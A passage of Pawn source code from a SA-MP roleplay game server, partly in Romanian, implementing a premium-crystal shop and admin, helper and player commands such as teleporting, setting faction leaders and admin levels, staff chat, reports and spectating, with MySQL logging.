            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 75 crystals to buy a vehicle slot.')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");
        }
        case 7: {
           /* if(PlayerInfo[playerid][pPremiumPoints] < 100)
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            Dialog_Show(playerid, DIALOG_BUYWALKIE, DIALOG_STYLE_INPUT, "Buy frequency", "Type the frequency that you want to buy bellow. You can only buy a frequency 3 number frequency (100-999).\nYou'll be able to set a password for your frequency.\nPrice: 15 crystals.", "Buy", "Close");*/
        }
        case 8: {
            /*if(PlayerInfo[playerid][pPremiumPoints] <= 100) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            if(PlayerInfo[playerid][pPhone] == 1) 
                return sendError(playerid, "You have already an iPhone.");
            
            gString[0] = (EOS);
            format(gString, sizeof gString, "Avantaje iPhone:\n- numar de telefon din 4 cifre la alegere.\n- poti dezactiva apelurile daca vrei sa primesti doar SMS-uri.\n- in chat va aparea `* Player turns of his iPhone`.\n- optiune de /reply raspunde la ultimul SMS primit.\n- optiune /block pentru a bloca temporar un numar de telefon.\n\nChoose a phone number:");
            Dialog_Show(playerid, DIALOG_IPHONE, DIALOG_STYLE_INPUT, "iPhone", gString, "Ok", "Cancel");*/
        }
        case 9: {
            if(PlayerInfo[playerid][pPremiumPoints] < 150) 
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            if(PlayerInfo[playerid][pMember] != 0) 
                return sendError(playerid, "Nu poti face acest lucru atat timp cat faci parte dintr-o factiune.");

            PlayerInfo[playerid][pPremiumPoints] -= 150;
            pUpdateInt(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);

            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 150 crystals to buy clear FH.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 150 cristale pentru a-ti sterge FH-ul.");
            
            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "UPDATE faction_logs SET `deleted` = '1' WHERE `player` = '%d'", PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");
            
            gString[0] = EOS;
            mysql_format(SQL, gQuery, sizeof(gQuery), "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 150 crystals to buy clear FH.')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gQuery, "", "");          
        }
        case 10: {
            if(PlayerInfo[playerid][pPremiumPoints] <= 300)
            {
                SendClientMessage(playerid, COLOR_LIGHTRED, "You need 300 crystals for this action.");
                return 1;
            }
            if( PlayerInfo[playerid][pClan] ) return SendClientMessage( playerid, -1, "{909CE7}LocalHost{FFFFFF}:Sunteti membru al unui clan" );
            Dialog_Show(playerid, DIALOG_SHOP_CLAN, DIALOG_STYLE_INPUT, "{909CE7}LocalHost: {FFFFFF}Clan", "{FFFFFF}Introduceti numele clanului:", "Cumpara", "Anuleaza");
        }
        case 11: {
            if(PlayerInfo[playerid][pPremiumPoints] < 150)
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");
            
            if(PlayerInfo[playerid][pPet] != 0)
                    return sendError(playerid, "You already have a pet!");

            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 150 crystals to buy a personal pet.", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 150 cristale pentru a-ti cumpara un pet personal.");
            
            PlayerInfo[playerid][pPet] = 1;
            PlayerInfo[playerid][pPremiumPoints] -= 150;

            pUpdateInt(playerid, "Pet", PlayerInfo[playerid][pPet]);
            pUpdateInt(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);

            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `Pet` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pPet], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            gString[0] = (EOS);
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 150 crystals to buy a personal pet.')", PlayerInfo[playerid][pSQLID], gString);
            mysql_tquery(SQL, gString, "", "");
        }
        case 12: {
            /*if(PlayerInfo[playerid][pPremiumPoints] < 100)
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");

            if(PlayerInfo[playerid][pMp3] != 0) 
                return SendClientMessage(playerid,-1, "You already have a mp3!");
            
            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 100 crystals to buy a MP3 Player.", 1, GetName(playerid), PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 100 cristale pentru a-ti cumpara un MP3 Player.");

            PlayerInfo[playerid][pMp3] = 1;
            PlayerInfo[playerid][pPremiumPoints] -= 100;
            
            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "update `users` set `Mp3` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pMp3], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 100 crystals to buy a MP3 Player.')", PlayerInfo[playerid][pSQLID], GetName(playerid), PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");*/
        }
        case 13: {
            /*if(PlayerInfo[playerid][pPremiumPoints] < 110)
                return Dialog_Show(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough crystals to do this.", "Close", "");

            PlayerInfo[playerid][pVoucher][1] ++;
            PlayerInfo[playerid][pPremiumPoints] -= 110; 
           
            sendStaffMessage(COLOR_RED, "%s [user:%d] paid 110 crystals to buy a voucher (100 crystals).", 1, PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            SCM(playerid, COLOR_GREY, "SHOP: {FFFFFF}Ai platit 110 cristale pentru a-ti cumpara un voucher (100 de cristale).");
            
            save_vouchers(playerid);
            pUpdateInt(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);
            
            gString[0] = EOS;
            mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid 110 crystals to buy a voucher (100 crystals)')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");*/
        }
    }
    return 1;
}
YCMD:closestcar(playerid, params[], help)
{
    check_admin

    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
        return SCM(playerid, COLOR_WHITE, "You can only use this command while on foot.");

    new
    	vehicleid = GetClosestVehicle(playerid, 200);

    if(vehicleid == INVALID_VEHICLE_ID || vehicleid < 1)
        return SCM(playerid, COLOR_WHITE, "No vehicles are in range.");

	PutPlayerInVehicleEx(playerid, vehicleid, 0);
	return ABroadCast(COLOR_PURPLE, 1, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) Admin %s has teleported to vehicle %d via [/closestcar].", GetName(playerid), vehicleid);
}

YCMD:killcp(playerid, params[], help)
{
    if(job_data[playerid][jobDuty] != JOB_TYPE_NONE)
        return stop_job_work(playerid);

    if(s_PlayerInfo[playerid][pSCP] != 0)
    {
        SCM(playerid, -1, "You have disabled the checkpoint.");
        
        DisablePlayerCheckpoint(playerid);
        DisablePlayerRaceCheckpoint(playerid);

        s_PlayerInfo[playerid][pSCP] = 0;
    }

    return 1;
}

YCMD:gotohouse(playerid, params[], help)
{
    check_admin

    new
        houseId;

    if(sscanf(params, "d", houseId))
        return sendSyntax(playerid, "/gotohouse [house id]");

    if(houseId < 1 || houseId > SERVER_HOUSES)
        return SCM(playerid, -1, "Invalid house id.");

    s_PlayerInfo[playerid][pSInHQ] = 0;
    s_PlayerInfo[playerid][pSInHouse] = 0;
    s_PlayerInfo[playerid][pSInBusiness] = 0;

    SetPlayerInterior(playerid, 0), SetPlayerVirtualWorld(playerid, 0);
    SetPlayerPosEx(playerid, HouseInfo[houseId][hExterior][0], HouseInfo[houseId][hExterior][1], HouseInfo[houseId][hExterior][2]);

    return ABroadCast(COLOR_ADMCOMMANDS, 1, "%s(%d) teleported to house %d", GetName(playerid), playerid, houseId);
}

YCMD:gotobiz(playerid, params[], help)
{
    check_admin

    new
        bizId;

    if(sscanf(params, "d", bizId))
        return sendSyntax(playerid, "/gotobiz [biz id]");

    if(bizId < 1 || bizId > SERVER_HOUSES)
        return SCM(playerid, -1, "Invalid biz id.");

    s_PlayerInfo[playerid][pSInHQ] = 0;
    s_PlayerInfo[playerid][pSInHouse] = 0;
    s_PlayerInfo[playerid][pSInBusiness] = 0;

    SetPlayerInterior(playerid, 0), SetPlayerVirtualWorld(playerid, 0);
    SetPlayerPosEx(playerid, BizInfo[bizId][bPosition][0], BizInfo[bizId][bPosition][1], BizInfo[bizId][bPosition][2]);

    return ABroadCast(COLOR_ADMCOMMANDS, 1, "%s(%d) teleported to biz %d", GetName(playerid), playerid, bizId);
}

YCMD:respawn(playerid, params[], help)
{
    check_admin

    new 
        targetId, Float: playerPosition[3];
    
    if(sscanf(params, "u", targetId)) 
        return sendSyntax(playerid, "/respawn [name/playerid]");
        
    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_GREY, "Player not conntected.");

    if(IsPlayerInAnyVehicle(targetId)) 
    {
        GetPlayerPos(targetId, playerPosition[0], playerPosition[1], playerPosition[2]); 
        SetPlayerPosEx(targetId, playerPosition[0], playerPosition[1], playerPosition[2] + 5.0);
        
        RemovePlayerFromVehicle(targetId); 
        SpawnPlayer(targetId);
    }

    SCMF(targetId, COLOR_RED2, "You have been respawned by %s.", GetName(playerid));
    SCMF(playerid, COLOR_RED2, "You respawned %s.", GetName(targetId));

    SpawnPlayer(targetId);

    return ABroadCast(COLOR_ADMCOMMANDS, 1, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) %s has respawned %s.", GetName(playerid), GetName(targetId));
}

YCMD:up(playerid, params[], help)
{
	check_admin
    return SlapPlayer(playerid); 
}

YCMD:a(playerid, params[], help)
{
	check_admin

	new
		stringMessage[128];

    if(sscanf(params, "s[128]", stringMessage))
    	return sendSyntax(playerid, "/a [message]");

    return ABroadCast(COLOR_ADMCHAT, 1, "(%d) Admin %s: %s", PlayerInfo[playerid][pAdmin], GetName(playerid), stringMessage);
}

YCMD:e(playerid, params[], help)
{
    if(!PlayerInfo[playerid][pAdmin] && !PlayerInfo[playerid][pHelper])
        return sendAcces(playerid);

    new
        stringMessage[144];

    if(sscanf(params, "s[144]", stringMessage))
        return sendSyntax(playerid, "/e [message]");

    return sendStaffMessage(COLOR_ADMIN, "(%d) %s %s: %s", (PlayerInfo[playerid][pAdmin] ? (PlayerInfo[playerid][pAdmin]) : (PlayerInfo[playerid][pHelper])), (PlayerInfo[playerid][pAdmin] ? ("Admin") : ("Helper")), GetName(playerid), stringMessage);
}
YCMD:setleader(playerid, params[], help) 
{
    if(PlayerInfo[playerid][pAdmin] < 4)
        return sendAcces(playerid);

    new 
        targetID, lLevel;

    if(sscanf(params, "ui", targetID, lLevel))
        return sendSyntax(playerid, "/setleader <Name/PlayerID> <Faction>");

    if(lLevel > 14 || lLevel < 1) 
        return sendError(playerid, "Don't go below number 1, or above number 14.");

    if(!IsPlayerConnected(targetID))
        return sendError(playerid, "Player not connected.");

    if(PlayerInfo[targetID][pMember] > 0 && PlayerInfo[targetID][pLeader] > 0) 
        return sendError(playerid, "This player is in a faction.");

    format(gString, sizeof gString, "Esti sigur ca doresti sa-l setezi pe %s ca lider al factiunii %s", GetName(targetID), NumeFactiune(lLevel));
    Dialog_Show(playerid, DIALOG_SETLEADER, DIALOG_STYLE_MSGBOX, "Confirm:", gString, "Da", "Nu");

    Factiune[playerid] = lLevel;
    FactiunePlayer[playerid] = targetID;
    
    return 1;           
}
Dialog:DIALOG_SETLEADER(playerid, response, listitem, inputtext[])
{
    if(response) {
            new para1 = FactiunePlayer[playerid];
            new escape[256] ,ftext[50], query[256], string[256], level = Factiune[playerid];
            if(level == 1) { ftext = "Los Santos Police Department"; } //Police Force
            else if(level == 2) { ftext = "Federal Bureau of Investigations"; } //FBI
            else if(level == 3) { ftext = "National Guard"; } //National Guard
            else if(level == 4) { ftext = "The Italian Mafia"; } //Italian
            else if(level == 5) { ftext = "Grove Street"; } //Grove Street
            else if(level == 6) { ftext = "The Russian Mafia"; } //The Russian Mafia
            else if(level == 7) { ftext = "Tow Car Company"; } //Tow Car Company
            else if(level == 8) { ftext = "San Fierro Police Department"; } //SFPD
            else if(level == 9) { ftext = "News Reporters"; } //News Reporter
            else if(level == 10) { ftext = "SF Bikers"; } //SF Bikers
            else if(level == 11) { ftext = "Hitman Agency"; } //The Agency
            else if(level == 12) { ftext = "School Instructors"; } //School Instructors
            else if(level == 13) { ftext = "Taxi San Fierro"; } //Los Santos Taxi
            else if(level == 14) { ftext = "Paramedic Department"; } //Paramedic
            PlayerInfo[para1][pMember] = level; PlayerInfo[para1][pLeader] = level;
            gString[0] = (EOS);
            format(string, sizeof(string), "Administrator %s has set you to lead group %s. >>", GetName(playerid), ftext);
            SendClientMessage(para1, COLOR_RED2, string);
            format(string, sizeof(string), "Admin %s has set %s to lead group %s >>", GetName(playerid), GetName(para1), ftext);
            //ABroadCast(COLOR_DARKPINK, string,1);
            ABroadCast(COLOR_DARKPINK, 1, string);
            format(string, sizeof(string), "%s is now the leader of faction %s.", GetName(para1), ftext);
            //Log(PlayerInfo[playerid][pSQLID], string, "staff");
            mysql_real_escape_string(string, escape);
           // Factionlog(level,PlayerInfo[para1][pSQLID],PlayerInfo[playerid][pSQLID],escape);
            mysql_format(SQL, query, sizeof(query), "insert into faction_logs (`text`, `player`,`leader`) values ('%s','%d','%d')", escape, PlayerInfo[para1][pSQLID],PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL,query,"","");
            mysql_format(SQL, query, sizeof(query), "insert into staff_logs (`text`) values ('%s')", escape);
            mysql_tquery(SQL,query,"","");
            if(IsACop(para1)) Iter_Add(Cops, para1);
            if(IsAMember(para1)) Iter_Add(Gangsters, para1);
            SetPlayerSkinEx(para1); PlayerInfo[para1][pRank] = 7;
            PlayerInfo[para1][pFactionJoin] = gettime();
            new wakaname[25];
            GetPlayerName(para1, wakaname, 25);
            gString[0] = (EOS);
            mysql_format(SQL, gString, 356, "update users set `Leader` = '%d',`Member` = '%d',`Rank` = '7',`Model` = '%d',`FactionJoin` = '%d' WHERE `name` = '%s'",PlayerInfo[para1][pLeader],PlayerInfo[para1][pMember],PlayerInfo[para1][pModel],PlayerInfo[para1][pFactionJoin],PlayerInfo[para1][pNormalName]);
            mysql_tquery(SQL, gString, "", "");
            gString[0] = (EOS);
            mysql_format(SQL, gString, 356, "UPDATE factions SET `Name7` = '1' WHERE `ID` = '%s'",PlayerInfo[para1][pMember]);
            mysql_tquery(SQL, gString, "", "");
            SetPlayerToTeamColor(para1);
           /* PlayerInfo[para1][Raport1] = 0; PlayerInfo[para1][Raport2] = 0;
            PlayerInfo[para1][Raport3] = 0; PlayerInfo[para1][Raport4] = 0;
            PlayerInfo[para1][Raport5] = 0; PlayerInfo[para1][Raport6] = 0;
            PlayerInfo[para1][pPaydayON] = 0;
            gQuery[0] = (EOS);
            mysql_format(SQL, gQuery, sizeof(gQuery), "update users set Raport1 = 0, Raport2 = 0, Raport3 = 0, Raport4 = 0, Raport5 = 0, Raport6 = 0, PaydayON = 0 WHERE name = '%s'",PlayerInfo[para1][pNormalName]);
            mysql_tquery(SQL, gQuery, "", "");*/
    }
}
YCMD:flip(playerid, params[], help)
{
    check_admin

    if(!IsPlayerInAnyVehicle(playerid))
        return SCM(playerid, COLOR_GREY, "You're not in a vehicle.");

    new
        Float: vAngle;

    GetVehicleZAngle(GetPlayerVehicleID(playerid), vAngle);
    SetVehicleZAngle(GetPlayerVehicleID(playerid), vAngle);

    return SCM(playerid, COLOR_WHITE, "Your vehicle has been flipped back over.");
}

YCMD:gotocar(playerid, params[], help)
{
    check_admin

    new
        vehicleID, Float: vPos[3];
    
    if(sscanf(params, "d", vehicleID))
        return sendSyntax(playerid, "/gotocar [vehicleid]");

    if(!IsValidVehicle(vehicleID))
        return SCM(playerid, -1, "Invalid vehicle id.");

    GetVehiclePos(vehicleID, vPos[0], vPos[1], vPos[2]);

    if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        SetVehiclePos(GetPlayerVehicleID(playerid), vPos[0], vPos[1], vPos[2]);
    else
        SetPlayerPosEx(playerid, vPos[0], vPos[1], vPos[2]);

    SCM(playerid, COLOR_GRAD1, "You have been teleported.");
    
    // log admin

    SetPlayerInterior(playerid, 0);
    SetPlayerVirtualWorld(playerid, 0);

    s_PlayerInfo[playerid][pSInHouse] = 0;
    s_PlayerInfo[playerid][pSInBusiness] = 0;

    return 1;
}

YCMD:spawnchange(playerid, params[], help)
{
    if(!PlayerInfo[playerid][pHouse])
        return SCM(playerid, -1, "Nu stai cu chirie sau nu esti detinatorul unei pentru a iti schimba locatia de spawn.");

    format(gString, sizeof gString, PlayerInfo[playerid][pMember] ? ("La HQ-ul factiunii %s") : ("La spawn civil"), "LSPD");

    if(PlayerInfo[playerid][pHouse])
        format(gString, sizeof gString, "%s\nLa casa cu ID %d", gString, PlayerInfo[playerid][pHouse]);

    Dialog_Show(playerid, DIALOG_SPAWNCHANGE, DIALOG_STYLE_LIST, "Select spawn", gString, "Select", "Close");
    return 1;
}

YCMD:getcar(playerid, params[], help)
{
	check_admin

    new
        vehicleid;

    if(sscanf(params, "i", vehicleid))
        return sendSyntax(playerid, "/getcar [carid]");
    
	if(!IsValidVehicle(vehicleid))
        return SCM(playerid, -1, "Invalid vehicle id.");

    new
        Float: vPos[3];

    GetPlayerPos(playerid, vPos[0], vPos[1], vPos[2]);
    SetVehiclePos(vehicleid, vPos[0], vPos[1]+4, vPos[2]);
    
    LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
    SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));

    return ABroadCast(0x909CE7FF, 1, "(Admin Info): {FFFFFF}%s teleported vehicle %d to him.", GetName(playerid), vehicleid);
}

YCMD:fixveh(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 2)
        return sendAcces(playerid);
    
    if(!IsPlayerInAnyVehicle(playerid)) 
        return SCM(playerid, -1, "You are not in a vehicle.");

    RepairVehicle(GetPlayerVehicleID(playerid));
    VehicleInfo[GetPlayerVehicleID(playerid)][vehFuel] = 100;
    
    return SCM(playerid, COLOR_WHITE, "Car was repaired successfully.");
}

YCMD:help(playerid, params[], help)
{
    Dialog_Show(playerid, DIALOG_HELP, DIALOG_STYLE_LIST, "SERVER: Commands", "General\nChat\nFactions\nHouses\nJobs\nBusinesses\nHelpers\nVehicles\nBank\nLeaders\nPet", "Select", "Exit");
    return 1;
}

YCMD:setadmin(playerid, params[], help) 
{
    new 
        targetId, adminLevel;

    if(PlayerInfo[playerid][pAdmin] < 6) 
        return sendAcces(playerid);

    if(sscanf(params, "ud", targetId, adminLevel))
        return sendSyntax(playerid, "/setadmin` [name/playerid] [admin level]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    if(adminLevel < 0 || adminLevel > 7 && PlayerInfo[playerid][pAdmin] < 7)
        return SCM(playerid, -1, "Level must be between 0 - 6.");

    SCMF(targetId, COLOR_YELLOW, "You've been promoted to level %d admin, by %s.", adminLevel, GetName(playerid));
    SCMF(playerid, COLOR_YELLOW, "You have promoted %s to a level %d admin.", GetName(targetId), adminLevel);

    format(gString, sizeof gString, "* Admin %s set %s's admin level to %d.", GetName(playerid), GetName(targetId), adminLevel);
    sendStaffMessage(COLOR_ADMCHAT, gString);

    if(adminLevel == 0) 
    {
        if(Iter_Contains(Admins, targetId))
            Iter_Remove(Admins, targetId);

        if(Iter_Contains(Spectators, targetId))
            Command_ReProcess(targetId, "specoff", false);

        PlayerInfo[targetId][pColor] = 0;
        s_PlayerInfo[playerid][pSFlyMode] = 0;
        
        StopFly(playerid);
    }
    if(!Iter_Contains(Admins, targetId) && adminLevel != 0)
        Iter_Add(Admins, targetId);

    PlayerInfo[targetId][pAdmin] = adminLevel;

    mysql_real_escape_string(gString, gString);

    mysql_format(SQL, gString, sizeof gString, "insert into `staff_logs` (`text`) values ('%s');", gString);
    mysql_tquery(SQL, gString, "", "");

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Admin` = '%d', `Color` = '%d' where `id` = '%d'", PlayerInfo[targetId][pAdmin], PlayerInfo[targetId][pColor], PlayerInfo[targetId][pSQLID]);
    mysql_tquery(SQL, gString, "", "");
    return 1;
}

YCMD:sethelper(playerid, params[], help) 
{   
    new 
        targetId, helperLevel;

    if(PlayerInfo[playerid][pAdmin] < 5)
        return sendAcces(playerid);

    if(sscanf(params, "ui", targetId, helperLevel)) 
        return sendSyntax(playerid, "/sethelper [name/playerid] [helper level]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    if(helperLevel < 0 || helperLevel > 3) 
        return SCM(playerid, -1, "Level must be between 0 - 3.");

    SCMF(targetId, COLOR_LIGHTBLUE, "You've been promoted to helper %d, by %s.", helperLevel, GetName(playerid));
    SCMF(playerid, COLOR_LIGHTBLUE, "You have promoted %s to helper %d.", GetName(targetId), helperLevel);

    format(gString, sizeof gString, "* Admin %s set %s's helper level to %d.", GetName(playerid), GetName(targetId), helperLevel);
    sendStaffMessage(COLOR_ADMIN, gString);

    if(helperLevel == 0)
    {
        PlayerInfo[targetId][pColor] = 0; 

        if(Iter_Contains(helpersOnDuty, targetId))
            Command_ReProcess(targetId, "hduty", false);
     
        if(Iter_Contains(Spectators, targetId))
            Command_ReProcess(targetId, "specoff", false);

        if(Iter_Contains(Helpers, targetId))
            Iter_Remove(Helpers, targetId);
    } 
    if(!Iter_Contains(Helpers, targetId) && helperLevel != 0)
        Iter_Add(Helpers, targetId);

    PlayerInfo[targetId][pHelper] = helperLevel; 

    mysql_real_escape_string(gString, gString);

    mysql_format(SQL, gString, sizeof gString, "insert into `staff_logs` (`text`) values ('%s');", gString);
    mysql_tquery(SQL, gString, "", "");

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Helper` = '%d', `Color` = '%d' where `id` = '%d'", PlayerInfo[targetId][pHelper], PlayerInfo[targetId][pColor], PlayerInfo[targetId][pSQLID]);
    mysql_tquery(SQL, gString, "", "");
    return 1; 
}

YCMD:admins(playerid, params[], help)
{
    SCM(playerid, COLOR_RED2, "{408080}-----Admins Online------------------------");

    new
    	adminAfk[32];
    
    foreach(new i : Admins)
    {
        if(!s_PlayerInfo[i][pSAFK]) 
            adminAfk = "";
        else
            format(adminAfk, sizeof adminAfk, " - AFK: %d", s_PlayerInfo[i][pSAFK]);

        if(PlayerInfo[playerid][pAdmin] >= 5)
        {
            if(Iter_Contains(Spectators, i))
                SCMF(playerid, -1, "{EEEEEE}(%d) %s - admin level %d%s - spectating %s (%d)", i, GetName(i), PlayerInfo[i][pAdmin], adminAfk, GetName(s_PlayerInfo[i][pSPlayerSpec]), s_PlayerInfo[i][pSPlayerSpec]);
            else 
                SCMF(playerid, -1, "{EEEEEE}(%d) %s - admin level %d%s", i, GetName(i), PlayerInfo[i][pAdmin], adminAfk);
        }
        else
            SCMF(playerid, -1, "{EEEEEE}(%d) %s - admin level %d", i, GetName(i), PlayerInfo[i][pAdmin]);
    }

    SCM(playerid, -1, "{408080}--------------------------------------------");
    SCM(playerid, -1, "Daca ai vreo problema, poti folosi /report. Pentru intrebari legate de joc poti folosi /n.");
    SCM(playerid, -1, "{408080}--------------------------------------------");

    return 1;
}

YCMD:helpers(playerid, params[], help)
{
    SCM(playerid, COLOR_RED2, "{408080}----Helpers Online-----------------------");

    foreach(new i : Helpers)
    {
        if(PlayerInfo[playerid][pAdmin] >= 5)
        {
            if(Iter_Contains(Spectators, i))
                SCMF(playerid, -1, "{EEEEEE}(%d) %s - helper level %d - AFK: %d - spectating %s (%d)", i, GetName(i), PlayerInfo[i][pHelper], s_PlayerInfo[i][pSAFK], GetName(s_PlayerInfo[i][pSPlayerSpec]), s_PlayerInfo[i][pSPlayerSpec]);
            else
                SCMF(playerid, -1, "{EEEEEE}(%d) %s - helper level %d - AFK: %d", i, GetName(i), PlayerInfo[i][pHelper], s_PlayerInfo[i][pSAFK]);
        }
        else
            SCMF(playerid, -1, "{EEEEEE}(%d) %s - helper level %d", i, GetName(i), PlayerInfo[i][pHelper]);
    }
    SCM(playerid, -1, "{408080}-------------------------------------------");
    SCM(playerid, -1, "Daca ai vreo intrebare legata de server, foloseste /n.");
    SCM(playerid, -1, "{408080}-------------------------------------------");
    return 1;
}

YCMD:leaders(playerid, params[], help)
{
    check_queries

    if(GetPVarInt(playerid, "leaders_delay") > gettime())
        return va_SendClientMessage(playerid, -1, "You can use this command in %d seconds.", GetPVarInt(playerid, "leaders_delay") - gettime());

    mysql_tquery(SQL, "select `name`, `Member`, `Status` from `users` where `Member` > 0 and `Rank` = '7';", "show_leaders", "i", playerid);
    return SetPVarInt(playerid, "leaders_delay", gettime() + 50);
}

function show_leaders(playerid)
{
    SCM(playerid, COLOR_RED2, "{408080}-------- Server Leaders ------------------------");

    for(new i; i < cache_num_rows(); i++)
    {
        new
            returnGroup = cache_get_field_content_int(i, "Member"),
            onlineStatus = cache_get_field_content_int(i, "Status"),
            returnPlayerName[MAX_PLAYER_NAME];

        cache_get_field_content(i, "name", returnPlayerName, SQL, MAX_PLAYER_NAME);

        va_SendClientMessage(playerid, -1, "%s - %s - %s", NumeFactiune(returnGroup), returnPlayerName, (onlineStatus ? ("{FF0000}OFFLINE") : ("{33AA33}ONLINE")));
    }

    return SCM(playerid, -1, "{408080}------------------------------------------------");
}

YCMD:spawnhere(playerid, params[], help)
{
    if (PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pHelper] < 1)
        return sendAcces(playerid);

    new id;
    if(sscanf(params, "u", id))
        return sendSyntax(playerid, "/spawnhere [name/playerid]");

    if(!IsPlayerConnected(id))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    new Float:pos[3];
    GetPlayerPos(id, pos[0], pos[1], pos[2]);
    
    SpawnPlayer(id);
    
    SetTimerEx("SetPlayerPositionEx", 1000, false, "ufffdd", id, pos[0], pos[1], pos[2], GetPlayerInterior(id), GetPlayerVirtualWorld(id));
    
    return sendStaffMessage(COLOR_WHITE, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) %s has /spawn-ed and restored %s position.", GetName(playerid), GetName(id));
}

YCMD:report(playerid, params[], help)
{
    if(PlayerInfo[playerid][pReportMuted] > 0)
        return SCMF(playerid, -1, "You are muted on /report for %d minutes.", PlayerInfo[playerid][pReportMuted]);

    if(GetPVarInt(playerid, "report_delay") > gettime())
        return SCMF(playerid, COLOR_WHITE, "Nu poti trimite un report timp de %d secunde.", GetPVarInt(playerid, "report_delay") - gettime());

    if(PlayerInfo[playerid][pAdmin] && PlayerInfo[playerid][pHelper]) 
        return SCM(playerid, COLOR_WHITE, "You can't send an report because you are an admin/helper.");
    
    Dialog_Show(playerid, DIALOG_REPORT, DIALOG_STYLE_LIST, "Report", "Sunt blocat/Cad prin mapa\nAlta problema\nVreau sa fac o afacere si am nevoie de ajutor\nContul meu este spart sau blocat\nRaporteaza DM\nRaporteaza un cheater\nIntrebari despre donatii", "Ok", "Inchide");
    return 1; 
}

YCMD:spec(playerid, params[], help)
{ 
    if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pHelper] < 1)
        return sendAcces(playerid);

    new id;
    if(sscanf(params, "u", id)) 
        return sendSyntax(playerid, "/spec <Name/Playerid>");

    if(!IsPlayerConnected(id)) 
        return SCM(playerid, COLOR_WHITE, "Player not connected.");

    if(id == playerid) 
        return SCM(playerid, COLOR_WHITE, "You can't spectate yourself.");

    if(Iter_Contains(Spectators, id)) 
        return SCM(playerid, COLOR_WHITE, "That player is on spectating someone else.");

    if(s_PlayerInfo[id][pSRegistrationStep]) 
        return SCM(playerid, COLOR_WHITE, "This player is currently in register.");

    if(!Iter_Contains(Spectators, playerid)) 
    {
        BeforeSpectate[playerid][pState] = GetPlayerState(playerid); 
        BeforeSpectate[playerid][pWorld] = GetPlayerVirtualWorld(playerid);
        BeforeSpectate[playerid][pInt] = GetPlayerInterior(playerid); 
        BeforeSpectate[playerid][pSpectating] = true;
        
        new 
            Float: x, Float: y, Float: z; 
        
        GetPlayerPos(playerid, x, y, z);
        
        if(!IsPlayerInAnyVehicle(playerid)) 
        { 
            BeforeSpectate[playerid][pOldPos][0] = x;
